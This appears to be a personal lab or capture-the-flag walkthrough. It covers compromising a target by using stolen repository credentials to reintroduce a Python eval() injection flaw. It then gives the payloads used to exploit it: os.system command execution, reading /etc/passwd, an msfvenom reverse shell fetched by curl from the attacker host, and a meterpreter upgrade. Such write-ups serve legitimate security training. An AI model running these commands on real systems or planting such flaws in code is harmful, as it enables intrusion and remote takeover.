# Exploitation

## Git repo exploitation

Then I looked for previous commit messages

![[vulnerable_code_version.png]]

The developer found out about the 
```python
eval()
```

Function and fixed the problem, so let's try to edit the *API.py* file to bypass the validations and make it vulnerable.

![[bypass.png]]

Then commit and push the changes with *jeremy's* credentials.

![[add_origin.png]]

The push

![[git_push.png]]

The check if the code was changed by getting the **API.py** file from the server.


![[bypass.png]]

The changes are reflected now let's exploit the RCE.

## RCE exploitation

Now that the code is vulnerable again let's try to run simple commands before getting a reverse shell.

I looked for payloads for the eval function. But the response was always 0. Then I tried the bash sleep function to see if it affected the response time.

Payload:

```python
__import__('os').system('$command')
```

So i tried with

```python
__import__('os').system('sleep 5')
```

And in the and i confirmed the RCE

![[blind_RCE.png]]

# More commands

Lets try to read the /etc/passwd file, for that I used the following payload


```python
open('/etc/passwd').read()
```

The command execute successfully

![[more_cmd.png]]

# Getting a reverse shell

Let's try to enumerate the tools available on the target. For that I tried to get the version of different tools and check the responses.

## Python2

From the [[Information gathering target 1]] phase on port 8000 the Werkzeug service is running for Python 2. So it's almost sure that Python2 is available on the target. Let's confirm it.

![[python_enum.png]]

I tried running the command locally as the provided environment has it.

![[confirmation.png]]


Let's try with ncat to see what happens.

## Ncat

![[ncat_enum.png]]

I tried a local test with a non-existing binary to check the output

![[local_test.png]]

So if  the response is zero there's a high probability for the binary to be installed on the target.

## Curl

Following the previous steps

![[curl_enum.png]]


# Reverse shell payload file transfer

Knowing that curl is available, I tried to transfer a reverse shell payload file to the target via CURL. 

## Generate the payload with msfvenom

Lets use **msfvenom** to generate a reverse shell payload. I know the machine runs Linux (it can be confirmed using Nmap) so generate payload using the following command.

```bash

msfvenom -p linux/x64/shell_reverse_tcp lhost=192.35.185.2 lport=4444 -f elf -o r

```

The output is the **r** file containing a **linux/x64/shell_reverse_tcp** payload.

## Set up a HTTP server on the attacker machine

The provided box have Python3 installed I used it as follows:

```bash
python3 -m http.server

```

That deployed a HTTP server on port 8000

![[python_http_server.png]]

## Transfer the payload

Now abusing the RCE vulnerability transfer the reverse shell payload:

![[curl_transfer.png]]


```python
__import__('os').system('curl http://192.35.185.2:8000/r -o /tmp/r')
```


The command was executed, because the log on the python http server shows a get request to the file.

IMPORTANT: transfer the file to a writable location. Common locations writable for all user are ***/tmp** or **/var/tmp**

![[target_get.png]]

Now make the file executable

```bash
chmod +x /tmp/r
```

![[make_executable.png]]


Set up a Metasploit handler for the payload 

![[msf_handler.png]]

Execute the reverse shell.

```python
__import__('os').system('/tmp/r')
```

The handler should receive the shell connection. Even tough for me it didn't work at first but after making it executable and executing it again it worked.

Given access to target 1 [[Exploitation target 1]] lets upgrade the spawned shell to a meterpreter as follows:

![[shell_2_meterpreter.png]]

Let's try to capture target 1 flag

![[flag_1.png]]

I found it, let's enumerate further the machine.


I checked the machine's network interfaces.

![[new_network.png]]

Let's try to apply pivoting techniques.

[[Pivoting target 1]]
